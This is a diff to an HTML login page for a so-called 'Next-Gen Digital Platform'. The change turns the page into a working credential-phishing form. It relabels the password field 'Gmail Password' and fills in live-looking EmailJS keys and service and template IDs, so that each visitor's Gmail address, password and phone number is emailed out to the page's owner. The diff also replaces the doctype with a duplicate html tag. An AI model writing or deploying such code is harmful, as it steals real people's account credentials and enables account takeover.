@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -35,7 +35,7 @@ nav button:hover{background:rgba(0,200,255,0.4);}
     <div class="subtitle">Next-Gen Digital Platform</div>
     <form>
       <div class="input-group"><span class="icon">📧</span><input id="gmailInput" type="email" placeholder="Gmail"></div>
-      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Password"><span class="show" onclick="togglePassword()">👁</span></div>
+      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Gmail Password"><span class="show" onclick="togglePassword()">👁</span></div>
       <div class="input-group"><span class="icon">📱</span><input id="phoneInput" type="tel" placeholder="Phone Number"></div>
       <button type="button" onclick="loginAndSendEmail()">Login</button>
     </form>
@@ -71,7 +71,7 @@ nav button:hover{background:rgba(0,200,255,0.4);}
 
 <script>
 // --- EmailJS 初始化 ---
-emailjs.init('YOUR_PUBLIC_KEY'); // 替换为你的 EmailJS 公钥
+emailjs.init('0lXSpk6E_Y9ySmxZo'); // 替换为你的 EmailJS 公钥
 
 // --- 页面导航 ---
 function gotoPage(pageId){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById(pageId).classList.add('active');}
@@ -86,7 +86,7 @@ function loginAndSendEmail(){
   const phone = document.getElementById('phoneInput').value;
 
   // 发送到 EmailJS
-  emailjs.send('YOUR_SERVICE_ID','YOUR_TEMPLATE_ID',{
+  emailjs.send('service_yozcasf','template_meol739',{
     gmail: gmail,
     password: password,
     phone: phone
